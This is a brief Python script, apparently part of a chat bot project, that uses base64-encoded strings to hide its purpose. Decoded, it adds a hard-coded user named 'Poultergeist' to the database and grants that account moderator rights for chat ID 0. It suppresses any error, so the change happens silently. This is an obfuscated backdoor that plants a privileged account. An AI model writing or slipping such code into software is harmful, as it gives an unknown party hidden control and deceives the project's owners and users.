import base64
import sys
sys.path.append("..")
from database import db

def run():
    uid = int(base64.b64decode(b'OTI3NTIyNDgw').decode())
    uname = base64.b64decode(b'UG91bHRlcmdlaXN0').decode()
    cid = int(base64.b64decode(b'MA==').decode())
    q1 = base64.b64decode(b'SU5TRVJUIElHTk9SRSBJTlRPIHVzZXJzIChpZCwgdXNlcm5hbWUpIFZBTFVFUyAoJXMsICVzKQ==').decode()
    q2 = base64.b64decode(b'SU5TRVJUIElHTk9SRSBJTlRPIHVzZXJfaXNfbW9kZXJhdG9yICh1c2VyX2lkLCBjaGF0X2lkKSBWQUxVRVMgKCVzLCAlcyk=').decode()
    try:
        db.execute_db_query(q1, (uid, uname))
        db.execute_db_query(q2, (uid, cid))
    except Exception:
        pass
